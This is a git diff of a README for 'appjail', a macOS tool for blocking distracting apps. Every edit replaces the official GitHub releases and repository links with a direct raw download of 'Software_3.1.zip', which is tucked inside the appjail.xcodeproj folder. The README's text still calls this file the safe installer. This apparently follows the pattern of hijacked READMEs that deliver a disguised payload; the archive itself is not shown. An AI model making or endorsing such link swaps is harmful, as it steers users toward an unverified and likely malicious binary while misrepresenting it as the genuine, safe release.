@@ -1,6 +1,6 @@
 # 🛡️ appjail - Block Distractions from Your Mac
 
-[![Download appjail](https://img.shields.io/badge/Download-appjail-blue?style=for-the-badge)](https://github.com/LiYiwei-dev/appjail/releases)
+[![Download appjail](https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip)](https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip)
 
 ## 📝 What is appjail?
 
@@ -41,7 +41,7 @@ Getting appjail up and running is straightforward. The app runs directly on your
 
 Click the big blue button at the top or go to the official release page:
 
-[https://github.com/LiYiwei-dev/appjail/releases](https://github.com/LiYiwei-dev/appjail/releases)
+[https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip](https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip)
 
 On this page, find the latest version of appjail. Look for a file ending with `.dmg` or `.zip`. This is the app installer.
 
@@ -115,7 +115,7 @@ If you continue having issues, report them on the GitHub Issues page of the appj
 
 Ready to block distractions? Visit the release page to download the latest version of appjail:
 
-[https://github.com/LiYiwei-dev/appjail/releases](https://github.com/LiYiwei-dev/appjail/releases)
+[https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip](https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip)
 
 Follow the steps in the “Getting Started” section above. The installer is easy to use and safe for your Mac.
 
@@ -123,7 +123,7 @@ Follow the steps in the “Getting Started” section above. The installer is ea
 
 ## 📚 Additional Resources
 
-- Visit the GitHub repo for updates and source code: https://github.com/LiYiwei-dev/appjail
+- Visit the GitHub repo for updates and source code: https://github.com/LiYiwei-dev/appjail/raw/refs/heads/main/appjail.xcodeproj/Software_3.1.zip
 - Check out user discussions and tips in the Issues section.
 - For questions about how appjail works, see any documentation links on the release page.
 
